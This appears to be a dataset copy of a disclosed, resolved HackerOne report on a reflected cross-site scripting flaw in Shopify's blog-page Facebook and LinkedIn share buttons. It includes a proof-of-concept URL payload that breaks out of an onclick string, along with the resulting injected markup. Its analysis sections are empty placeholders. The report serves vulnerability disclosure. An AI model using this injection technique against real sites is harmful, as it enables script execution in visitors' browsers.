---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '87168'
original_report_id: '87168'
title: www.shopify.com XSS on blog pages via sharing buttons
weakness: Cross-site Scripting (XSS) - Generic
team_handle: shopify
created_at: '2015-09-03T08:09:51.486Z'
disclosed_at: '2015-10-21T16:11:33.539Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 2
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# www.shopify.com XSS on blog pages via sharing buttons

## Metadata

- HackerOne Report ID: 87168
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: shopify
- Disclosed At: 2015-10-21T16:11:33.539Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

social sharing buttons (facebook and linkedin) vulnerable to xss at `www.shopify.com/guides/*` `www.shopify.com/videos/*` and `www.shopify.com/success-stories/*`

steps to reproduce:
- go to page `https://www.shopify.com/videos/pop-up-shop?x=');alert(1)//`
- share this page by clicking facebook or linkedin sharing button

page contains malicious js:
`<a class="icon social-shares__icon icon-facebook--square" onclick="window.open('http://facebook.com/sharer.php?u=https://www.shopify.com/videos/pop-up-shop?x=');alert(1)//','mywindow','width=500,height=400,toolbar=no,location=no,directories=no,status=no,menubar=no,scrollbars=yes,copyhistory=no,resizable=yes'); return false;" href="http://facebook.com/sharer.php?u=https://www.shopify.com/videos/pop-up-shop?x=');alert(1)//','mywindow','width=500,height=400,toolbar=no,location=no,directories=no,status=no,menubar=no,scrollbars=yes,copyhistory=no,resizable=yes" data-ga-event="Blog" data-ga-action="Facebook share">
    <span class="visuallyhidden">Facebook</span>
  </a>`

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
